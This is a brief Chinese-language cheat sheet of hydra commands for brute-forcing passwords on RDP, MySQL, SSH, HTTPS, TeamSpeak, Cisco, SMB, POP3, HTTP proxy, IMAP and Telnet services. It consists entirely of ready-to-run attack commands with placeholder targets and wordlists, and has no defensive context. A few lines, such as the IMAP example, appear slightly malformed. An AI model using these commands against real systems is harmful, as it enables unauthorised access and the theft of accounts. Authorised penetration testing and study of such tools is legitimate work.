### hydra

破解rdp(3389)：

`hydra -l administrator -P password.txt -V IP rdp`

破解mysql：

`hydra ip -L 用户名 -P pass.txt -V mysql`

破解ssh：

`hydra -L user.txt -P password.txt -e ns -vV IP ssh`

破解https：

`hydra -m /index.php -l muts -P pass.txt IP https`

破解teamspeak：

`hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak`

破解cisco：

`hydra -P pass.txt IP cisco`

`hydra -m cloud -P pass.txt IP cisco-enable`

破解smb：

`hydra -l administrator -P pass.txt IP smb`

破解pop3：

`hydra -l muts -P pass.txt my.pop3.mail pop3`

破解http-proxy：

`hydra -l admin -P pass.txt http-proxy://IP`

破解imap：

`hydra -L user.txt -p imap://ip PLAIN`

`hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN`

破解telnet

`hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V`